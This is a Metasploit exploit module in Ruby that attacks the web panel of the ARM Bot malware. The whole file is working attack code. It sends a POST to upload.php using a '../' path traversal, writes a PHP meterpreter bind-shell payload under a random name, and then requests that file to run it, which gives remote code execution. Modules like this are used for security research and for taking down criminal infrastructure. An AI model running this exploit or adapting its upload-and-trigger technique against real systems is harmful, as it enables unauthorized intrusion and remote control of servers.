##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "ARM Bot Panel Remote Code Execution",
      'Description'    => %q{
        This module exploits the remote code execution vulnerability of ARM Bot malware panel.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Ege Balcı <ege.balci@invictuseurope.com>' # author & msf module
        ],
      'References'     =>
        [
          ['URL', 'https://prodaft.com']
        ],
      'DefaultOptions'  =>
        {
          'SSL' => false,
          'WfsDelay' => 5,
        },
      'Platform'       => ['php'],
      'Arch'           => [ ARCH_PHP],
      'Targets'        =>
        [
          ['PHP payload',
            {
              'Platform' => 'PHP',
              'Arch' => ARCH_PHP,
              'DefaultOptions' => {'PAYLOAD'  => 'php/meterpreter/bind_tcp'}
            }
          ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "August 05 2019",
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI of the ARM Bot', '/ARMBot'])
      ]
    )
  end


  def exploit
 
    name = '.'+Rex::Text.rand_text_alpha(4)+'.php'

    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path,'/upload.php'),
      'data'      => "file=../#{name}&data=#{URI::encode(Base64.encode64(payload.encoded))}&message=!"
    })

    if res && (res.code == 200 ||res.code == 100)
      print_good("Payload uploaded under #{target_uri.path}/#{name}")
    else
      print_error("Server responded with code #{res.code}") if res
      print_error("Failed to upload payload #{name}")
      return false
    end

    send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path,'/',name)}, 3
    )
    
    print_good("Payload successfully triggered !")
  end
end
